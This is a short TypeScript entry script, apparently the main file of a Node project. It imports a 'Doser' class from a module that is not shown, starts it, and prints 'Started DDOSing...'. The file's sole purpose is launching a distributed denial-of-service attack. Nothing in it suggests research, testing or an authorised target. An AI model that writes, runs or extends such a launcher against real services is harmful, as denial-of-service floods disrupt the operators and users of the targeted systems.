import {Doser} from "./doser";

// Tutorial: https://khalilstemmler.com/blogs/typescript/node-starter-project/
// https://blog.appsignal.com/2022/01/19/how-to-set-up-a-nodejs-project-with-typescript.html

// const args = process.argv;
// console.log('Script started: ', args);
let timeout = undefined;

function start() {
  const doser = new Doser()//32

  console.log('Started DDOSing...')
  doser.start(); //Start DDOSing
}

start();
